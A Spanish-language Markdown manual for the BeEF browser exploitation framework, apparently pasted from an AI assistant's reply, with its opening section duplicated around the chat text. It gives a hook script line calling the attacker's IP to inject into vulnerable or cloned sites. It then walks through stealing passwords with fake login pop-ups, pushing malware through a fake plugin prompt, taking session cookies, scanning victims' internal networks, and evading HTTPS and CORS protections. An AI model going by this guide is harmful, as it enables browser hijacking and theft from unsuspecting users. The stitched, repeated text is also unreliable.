# 🐂 Manual de Uso: BeEF

> **Browser Exploitation Framework**. Se especializa en atacar navegadores web para usarlos como "cabeza de playa" en una red.

## 🎣 Flujo de Trabajo: El ataque del "Gancho"

El funcionamiento de BeEF se basa en tres pasos críticos:

### 1. Iniciar el Servidor
Ejecuta BeEF en tu terminal y abre el panel de control (requiere credenciales por defecto `beef` / `beef`).

```bash
sudo beef-xss
# Panel de Control: [http://127.0.0.1:3000/ui/panel](http://127.0.0.1:3000/ui/panel)

2. Inyectar el Hook (El Anzuelo)
El objetivo debe visitar una página web que contenga el script malicioso. Debes inyectar esta línea en el código HTML de una web vulnerable (XSS) o en una web clonada:

<script src="http://[TU_IP]:3000/hook.js"></script>

Aquí tienes el manual final para BeEF.

Para este, he aprovechado una función especial de GitHub llamada "Alerts" (lo verás en la parte de [!IMPORTANT]). Cuando subas esto a GitHub, esa parte se convertirá automáticamente en una caja de alerta morada muy profesional.

He usado el emoji del buey/toro 🐂 por el nombre de la herramienta.

Copia esto en tu archivo BeEFmanual.md:

Markdown

# 🐂 Manual de Uso: BeEF

> **Browser Exploitation Framework**. Se especializa en atacar navegadores web para usarlos como "cabeza de playa" en una red.

## 🎣 Flujo de Trabajo: El ataque del "Gancho"

El funcionamiento de BeEF se basa en tres pasos críticos:

### 1. Iniciar el Servidor
Ejecuta BeEF en tu terminal y abre el panel de control (requiere credenciales por defecto `beef` / `beef`).

```bash
sudo beef-xss
# Panel de Control: [http://127.0.0.1:3000/ui/panel](http://127.0.0.1:3000/ui/panel)
2. Inyectar el Hook (El Anzuelo)
El objetivo debe visitar una página web que contenga el script malicioso. Debes inyectar esta línea en el código HTML de una web vulnerable (XSS) o en una web clonada:

HTML

<script src="http://[TU_IP]:3000/hook.js"></script>
3. Control (Command & Control)
En cuanto el navegador de la víctima carga ese script, aparecerá como "Online" en tu panel (columna izquierda). Ahora puedes enviarle comandos.

🎛️ Módulos y Comandos Destacados
Una vez el navegador está "enganchado", puedes lanzar estos ataques desde la pestaña Commands:

🎭 Ingeniería Social (Social Engineering)
Pretty Theft: Lanza una ventana flotante falsa (pop-up) simulando un login de Facebook, Google o LinkedIn. Si el usuario escribe su contraseña, esta se envía a tu panel.

Fake Notification: Muestra una barra de notificación falsa en el navegador pidiendo instalar un "plugin" (que en realidad es un malware).

💻 Información del Host (Host)
Get Cookies: Roba las cookies de sesión (útil para Session Hijacking).

Get Installed Plugins: Lista qué extensiones tiene instaladas el navegador.

Webcam / Microphone: (Experimental) Intenta pedir permisos para activar la cámara o micro.

🌐 Red (Network)
Port Scanner: ¡Muy potente! Usa el navegador de la víctima para escanear la red interna (Intranet) de la empresa, saltándose el firewall perimetral.

[!IMPORTANT] Nota de Seguridad y Evasión Para que BeEF funcione en navegadores modernos, a menudo es necesario evadir protecciones como el HTTPS o las políticas CORS.

Si la web víctima usa HTTPS, tu servidor BeEF también debería tener un certificado SSL, o el navegador bloqueará el script por "contenido mixto".


